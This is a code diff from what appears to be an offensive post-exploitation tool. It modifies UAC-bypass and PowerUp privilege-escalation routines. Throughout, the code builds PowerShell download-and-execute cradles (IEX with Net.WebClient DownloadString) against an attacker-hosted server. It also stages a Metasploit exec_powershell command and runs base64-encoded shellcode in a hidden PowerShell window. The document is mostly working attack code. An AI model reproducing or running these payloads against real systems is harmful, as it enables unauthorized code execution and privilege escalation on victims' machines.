@@ -26,15 +26,17 @@ class EXTRAS(object):
     def UACBYPASS(self, version):
         randomPort = FUNCTIONS().randomUnusedPort()
         uacbypassrcfilecontents = """run post/windows/manage/exec_powershell SCRIPT="IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/stage.ps1')" SESSION=1"""% (FUNCTIONS().CheckInternet(), randomPort)
+        moduleport = random.randint(5000,9000)
+        FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), "", "./externalmodules", port = moduleport, printIt = False)
         if version == "7":
-            uacbypassfilecontent = """IEX (New-Object Net.WebClient).DownloadString("https://github.com/PowerShellEmpire/Empire/raw/master/data/module_source/privesc/Invoke-BypassUAC.ps1");\nInvoke-BypassUAC -Command \"powershell -enc %s\" """ % (
-            base64.b64encode(self.injectshellcode_nosleep.encode('utf_16_le')))
+            uacbypassfilecontent = """IEX (New-Object Net.WebClient).DownloadString("http://%s:%s/Invoke-BypassUAC.ps1");\nInvoke-BypassUAC -Command \"powershell -enc %s\" """ % (
+            FUNCTIONS().CheckInternet(), moduleport, base64.b64encode(self.injectshellcode_nosleep.encode('utf_16_le')))
             a = multiprocessing.Process(target=FUNCTIONS().stagePowershellCode, args=(uacbypassfilecontent, randomPort))
             a.daemon = True
             a.start()
         elif version == "10":
-            uacbypassfilecontent = """IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/Charliedean/Invoke-SilentCleanUpBypass/master/Invoke-SilentCleanUpBypass.ps1");\nInvoke-SilentCleanUpBypass -Command \"cmd /c powershell -WindowStyle Hidden -enc %s && REM\" """ % (
-            base64.b64encode(self.injectshellcode_nosleep.encode('utf_16_le')))
+            uacbypassfilecontent = """IEX (New-Object Net.WebClient).DownloadString("http://%s:%s/Invoke-SilentCleanUpBypass.ps1");\nInvoke-SilentCleanUpBypass -Command \"cmd /c powershell -WindowStyle Hidden -enc %s && REM\" """ % (
+            FUNCTIONS().CheckInternet(), moduleport, base64.b64encode(self.injectshellcode_nosleep.encode('utf_16_le')))
             a = multiprocessing.Process(target=FUNCTIONS().stagePowershellCode, args=(uacbypassfilecontent, randomPort))
             a.daemon = True
             a.start()
@@ -44,9 +46,11 @@ class EXTRAS(object):
             return self.ez2read_shellcode
 
     def ALLCHECKS(self):
+        moduleport = random.randint(5000,9000)
+        FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), "", "./externalmodules", port = moduleport, printIt = False)
         with open('allchecks.ps1', 'w') as allchecksfile:
             allchecksfile.write(
-                """IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1");invoke-allchecks""")
+                """IEX (New-Object Net.WebClient).DownloadString("http://%s:%s/PowerUp.ps1");invoke-allchecks"""%(FUNCTIONS().CheckInternet(), moduleport))
             allchecksfile.close()
             return self.ez2read_shellcode
 
